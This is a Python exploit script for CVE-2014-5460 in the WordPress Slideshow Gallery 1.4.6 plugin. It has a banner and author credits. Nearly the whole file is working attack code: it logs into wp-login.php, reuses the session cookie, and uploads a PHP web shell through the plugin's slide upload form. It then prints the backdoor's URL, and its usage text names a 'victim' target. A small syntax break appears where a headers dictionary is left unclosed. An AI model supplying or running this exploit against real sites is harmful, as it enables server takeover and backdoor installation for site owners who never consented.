#
# WordPress Slideshow Gallery 1.4.6 Shell Upload Exploit
#
# WordPress Slideshow Gallery plugin version 1.4.6 suffers from a remote shell upload vulnerability (CVE-2014-5460)
#
# Vulnerability discovered by: Jesus Ramirez Pichardo - http://whitexploit.blogspot.mx/
#
# Exploit written by: Claudio Viviani - info@homelab.it - http://www.homelab.it
#
#
# Disclaimer:
#
# This exploit is intended for educational purposes only and the author
# can not be held liable for any kind of damages done whatsoever to your machine,
# or damages caused by some other,creative application of this exploit.
# In any case you disagree with the above statement,stop here.
#
#
# Requirements:
#
# 1) Enabled user management slide
# 2) python&#039;s httplib2 lib
#    Installation: pip install httplib2
#
# Usage:
#
# python wp_gallery_slideshow_146_suv.py -t http[s]://localhost -u user -p pwd -f sh33l.php
# python wp_gallery_slideshow_146_suv.py -t http[s]://localhost:80|443 -u user -p pwd -f sh33l.php
#
# Backdoor Location:
#
# http://localhost/wp-content/uploads/slideshow-gallery/sh33l.php
#
#

# http connection
import urllib, httplib2, sys, mimetypes
# Args management
import optparse
# Error management
import socket, httplib, sys
# file management
import os, os.path

# Check url
def checkurl(url):
    if url[:8] != "https://" and url[:7] != "http://":
        print(&#039;[X] You must insert http:// or https:// procotol&#039;)
        sys.exit(1)
    else:
        return url

# Check if file exists and has readable
def checkfile(file):
    if not os.path.isfile(file) and not os.access(file, os.R_OK):
        print &#039;[X] &#039;+file+&#039; file is missing or not readable&#039;
        sys.exit(1)
    else:
        return file
# Get file&#039;s mimetype
def get_content_type(filename):
    return mimetypes.guess_type(filename)[0] or &#039;application/octet-stream&#039;

# Create multipart header
def create_body_sh3ll_upl04d(payloadname):

   getfields = dict()
   getfields[&#039;Slide[id]&#039;] = &#039;&#039;
   getfields[&#039;Slide[order]&#039;] = &#039;&#039;
   getfields[&#039;Slide[title]&#039;] = &#039;h0m3l4b1t&#039;
   getfields[&#039;Slide[description]&#039;] = &#039;h0m3l4b1t&#039;
   getfields[&#039;Slide[showinfo]&#039;] = &#039;both&#039;
   getfields[&#039;Slide[iopacity]&#039;] = &#039;70&#039;
   getfields[&#039;Slide[type]&#039;] = &#039;file&#039;
   getfields[&#039;Slide[image_url]&#039;] = &#039;&#039;
   getfields[&#039;Slide[uselink]&#039;] = &#039;N&#039;
   getfields[&#039;Slide[link]&#039;] = &#039;&#039;
   getfields[&#039;Slide[linktarget]&#039;] = &#039;self&#039;
   getfields[&#039;Slide[title]&#039;] = &#039;h0m3l4b1t&#039;

   payloadcontent = open(payloadname).read()

   LIMIT = &#039;----------lImIt_of_THE_fIle_eW_$&#039;
   CRLF = &#039;\r\n&#039;

   L = []
   for (key, value) in getfields.items():
      L.append(&#039;--&#039; + LIMIT)
      L.append(&#039;Content-Disposition: form-data; name="%s"&#039; % key)
      L.append(&#039;&#039;)
      L.append(value)

   L.append(&#039;--&#039; + LIMIT)
   L.append(&#039;Content-Disposition: form-data; name="%s"; filename="%s"&#039; % (&#039;image_file&#039;, payloadname))
   L.append(&#039;Content-Type: %s&#039; % get_content_type(payloadname))
   L.append(&#039;&#039;)
   L.append(payloadcontent)
   L.append(&#039;--&#039; + LIMIT + &#039;--&#039;)
   L.append(&#039;&#039;)
   body = CRLF.join(L)
   return body

banner = """

 $$$$$$\  $$\ $$\       $$\                     $$\
$$  __$$\ $$ |\__|      $$ |                    $$ |
$$ /  \__|$$ |$$\  $$$$$$$ | $$$$$$\   $$$$$$$\ $$$$$$$\   $$$$$$\  $$\  $$\  $$\
\$$$$$$\  $$ |$$ |$$  __$$ |$$  __$$\ $$  _____|$$  __$$\ $$  __$$\ $$ | $$ | $$ |
 \____$$\ $$ |$$ |$$ /  $$ |$$$$$$$$ |\$$$$$$\  $$ |  $$ |$$ /  $$ |$$ | $$ | $$ |
$$\   $$ |$$ |$$ |$$ |  $$ |$$   ____| \____$$\ $$ |  $$ |$$ |  $$ |$$ | $$ | $$ |
\$$$$$$  |$$ |$$ |\$$$$$$$ |\$$$$$$$\ $$$$$$$  |$$ |  $$ |\$$$$$$  |\$$$$$\$$$$  |
 \______/ \__|\__| \_______| \_______|\_______/ \__|  \__| \______/  \_____\____/



             $$$$$$\            $$\ $$\                                       $$\ $$\   $$\     $$$$$$\
            $$  __$$\           $$ |$$ |                                    $$$$ |$$ |  $$ |   $$  __$$\
            $$ /  \__| $$$$$$\  $$ |$$ | $$$$$$\   $$$$$$\  $$\   $$\       \_$$ |$$ |  $$ |   $$ /  \__|
            $$ |$$$$\  \____$$\ $$ |$$ |$$  __$$\ $$  __$$\ $$ |  $$ |        $$ |$$$$$$$$ |   $$$$$$$\
            $$ |\_$$ | $$$$$$$ |$$ |$$ |$$$$$$$$ |$$ |  \__|$$ |  $$ |        $$ |\_____$$ |   $$  __$$\
            $$ |  $$ |$$  __$$ |$$ |$$ |$$   ____|$$ |      $$ |  $$ |        $$ |      $$ |   $$ /  $$ |
            \$$$$$$  |\$$$$$$$ |$$ |$$ |\$$$$$$$\ $$ |      \$$$$$$$ |      $$$$$$\ $$\ $$ |$$\ $$$$$$  |
             \______/  \_______|\__|\__| \_______|\__|       \____$$ |      \______|\__|\__|\__|\______/
                                                            $$\   $$ |
                                                            \$$$$$$  |
                                                             \______/

                                                                   W0rdpr3ss Sl1d3sh04w G4ll3ry 1.4.6 Sh3ll Upl04d Vuln.

                          =============================================
                          - Release date: 2014-08-28
                          - Discovered by: Jesus Ramirez Pichardo
                          - CVE: 2014-5460
                          =============================================

                                          Written by:

                                        Claudio Viviani

                                     http://www.homelab.it

                                        info@homelab.it
                                     homelabit@protonmail.ch

                                https://www.facebook.com/homelabit
                                https://twitter.com/homelabit
                                https://plus.google.com/+HomelabIt1/
                      https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww
"""

commandList = optparse.OptionParser(&#039;usage: %prog -t URL -u USER -p PASSWORD -f FILENAME.PHP [--timeout sec]&#039;)
commandList.add_option(&#039;-t&#039;, &#039;--target&#039;, action="store",
                  help="Insert TARGET URL: http[s]://www.victim.com[:PORT]",
                  )
commandList.add_option(&#039;-f&#039;, &#039;--file&#039;, action="store",
                  help="Insert file name, ex: shell.php",
                  )
commandList.add_option(&#039;-u&#039;, &#039;--user&#039;, action="store",
                  help="Insert Username",
                  )
commandList.add_option(&#039;-p&#039;, &#039;--password&#039;, action="store",
                  help="Insert Password",
                  )
commandList.add_option(&#039;--timeout&#039;, action="store", default=10, type="int",
                  help="[Timeout Value] - Default 10",
                  )

options, remainder = commandList.parse_args()

# Check args
if not options.target or not options.user or not options.password or not options.file:
    print(banner)
    commandList.print_help()
    sys.exit(1)

payloadname = checkfile(options.file)
host = checkurl(options.target)
username = options.user
pwd = options.password
timeout = options.timeout

print(banner)

url_login_wp = host+&#039;/wp-login.php&#039;
url_admin_slideshow = host+&#039;/wp-admin/admin.php?page=slideshow-slides&method=save&#039;

content_type = &#039;multipart/form-data; boundary=----------lImIt_of_THE_fIle_eW_$&#039;

http = httplib2.Http(disable_ssl_certificate_validation=True, timeout=timeout)

body = { &#039;log&#039;:username,
         &#039;pwd&#039;:pwd,
         &#039;wp-submit&#039;:&#039;Login&#039;,
         &#039;testcookie&#039;:&#039;1&#039; }
headers = { &#039;User-Agent&#039;: &#039;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36&#039;,
            &#039;Content-type&#039;: &#039;application/x-www-form-urlencoded&#039;,
try:
    response, content = http.request(url_login_wp, &#039;POST&#039;, headers=headers, body=urllib.urlencode(body))
    if len(response[&#039;set-cookie&#039;].split(" ")) < 4:
    #if &#039;httponly&#039; in response[&#039;set-cookie&#039;].split(" ")[-1]:
        print &#039;[X] Wrong username or password&#039;
        sys.exit()
    else:
        print &#039;[+] Username & password ACCEPTED!\n&#039;

        # Create cookie for admin panel
        if &#039;secure&#039; in response[&#039;set-cookie&#039;]:
            c00k13 = response[&#039;set-cookie&#039;].split(" ")[6]+&#039; &#039;+response[&#039;set-cookie&#039;].split(" ")[0]+&#039; &#039;+response[&#039;set-cookie&#039;].split(" ")[10]
        else:
            c00k13 = response[&#039;set-cookie&#039;].split(" ")[5]+&#039; &#039;+response[&#039;set-cookie&#039;].split(" ")[0]+&#039; &#039;+response[&#039;set-cookie&#039;].split(" ")[8]

        bodyupload = create_body_sh3ll_upl04d(payloadname)

        headers = {&#039;User-Agent&#039;: &#039;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36&#039;,
                   &#039;Cookie&#039;: c00k13,
                   &#039;content-type&#039;: content_type,
                   &#039;content-length&#039;: str(len(bodyupload)) }
        response, content = http.request(url_admin_slideshow, &#039;POST&#039;, headers=headers, body=bodyupload)

        if &#039;admin.php?page=slideshow-slides&Galleryupdated=true&Gallerymessage=Slide+has+been+saved&#039; in content:
            print &#039;[!] Shell Uploaded!&#039;
            print &#039;[+] Check url: &#039;+host+&#039;/wp-content/uploads/slideshow-gallery/&#039;+payloadname.lower()+&#039; (lowercase!!!!)&#039;
        else:
            print &#039;[X] The user can not upload files or plugin fixed :(((&#039;

except socket.timeout:
    print(&#039;[X] Connection Timeout&#039;)
    sys.exit(1)
except socket.error:
    print(&#039;[X] Connection Refused&#039;)
    sys.exit(1)
except httplib.ResponseNotReady:
    print(&#039;[X] Server Not Responding&#039;)
    sys.exit(1)
except httplib2.ServerNotFoundError:
    print(&#039;[X] Server Not Found&#039;)
    sys.exit(1)
except httplib2.HttpLib2Error:
    print(&#039;[X] Connection Error!!&#039;)
    sys.exit(1)

